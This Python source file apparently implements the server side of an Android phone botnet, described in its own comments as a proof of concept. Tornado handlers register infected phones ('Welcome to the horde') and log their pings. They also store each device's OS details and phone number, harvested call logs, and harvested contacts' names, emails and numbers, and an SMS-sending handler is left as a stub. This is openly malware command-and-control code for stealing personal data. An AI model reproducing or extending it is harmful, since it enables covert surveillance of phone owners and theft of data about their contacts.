'''
Created on Mar 15, 2012

@author: moloch

    Copyright [2012] [Redacted Labs]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''


import json
import logging

from models import PhoneBot, CallInfo, Contact
from datetime import datetime
from handlers.BaseHandlers import BotBaseHandler
from tornado.web import RequestHandler
from libs.SecurityDecorators import bots

class BotHelloHandler(BotBaseHandler):

    @bots
    def get(self, *args, **kwargs):
        ''' Bots come here and say hello '''
        bot = PhoneBot.by_uuid(self.request.headers['Uuid'])
        if bot == None:
            bot = PhoneBot(uuid = self.request.headers['Uuid'].encode('utf-8', 'ignore'))
            self.dbsession.add(bot)
            self.dbsession.flush()
            self.write("Welcome to the horde")
        else:
            self.write("Pink evil robots")
        self.finish()

class BotVersionHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        ''' Collects version information '''
        try:
            # Prbly need to refactor this but it's more of a PoC
            self.bot.os_version = self.get_argument("os_version").encode('utf-8', 'ignore')
            self.bot.build_version = self.get_argument("build_version").encode('utf-8', 'ignore')
            self.bot.sdk_version = self.get_argument("sdk_version").encode('utf-8', 'ignore')
            self.bot.release_version = self.get_argument("release_version").encode('utf-8', 'ignore')
            self.bot.codename = self.get_argument("codename").encode('utf-8', 'ignore')
            self.bot.device = self.get_argument("device").encode('utf-8', 'ignore')
            self.bot.model = self.get_argument("model").encode('utf-8', 'ignore')
            self.bot.product = self.get_argument("product").encode('utf-8', 'ignore')
            self.bot.phone_number = self.get_argument("phone_number").encode('utf-8', 'ignore')
        except:
            self.write("error")
            self.finish()
            return
        self.dbsession.add(self.bot)
        self.dbsession.flush()
        self.write("ok")
        self.finish()

class BotCallsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        #try:
        jsonCalls = self.get_argument("jsonCalls")
        calls = json.loads(jsonCalls)
        for key in calls.keys():
            call = json.loads(calls[key])
            phone_call = CallInfo(
                    phone_bot_id = self.bot.id,
                    call_type = call['callType'],
                    number_type = call['numberType'],
                    phone_number = call['phoneNumber'],
                    contact_name = call['contactName'],
            )
            self.dbsession.add(phone_call)
        self.dbsession.flush()
        #except:
        #    self.write("error")
        #    self.finish()
        #    return
        self.write("ok")
        self.finish()

class BotContactsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        try:
            jsonContact = self.get_argument("jsonContact")
        except:
            self.write("Error: Missing parameter")
            self.finish()
            return
        new_contact = json.loads(jsonContact)
        if Contact.by_phone_number(new_contact['phoneNumber']) == None:
            contact = Contact(
                phone_bot_id = self.bot.id,
                name = new_contact['contactName'].replace(";", "").encode('utf-8', 'ignore'),
                email = new_contact['contactEmail'].replace(";", "").encode('utf-8', 'ignore'),
                phone_number = new_contact['phoneNumber'].replace(";", "").encode('utf-8', 'ignore'),
            )
            self.dbsession.add(contact)
            self.dbsession.flush()
        self.write("ok")
        self.finish()

class BotSmsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        pass

class BotSendSmsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        try:
            contact_id = self.get_argument("sms-contact")
            text_message = self.get_argument("sms-text")
        except:
            self.render("user/error.html", operation = "Send SMS", errors = "Missing parameters")
            return

class BotPingHandler(BotBaseHandler):

    @bots
    def get(self, *args, **kwargs):
        ''' Updates the last_seen '''
        self.bot.last_seen = datetime.now()
        self.dbsession.add(self.bot)
        self.dbsession.flush()
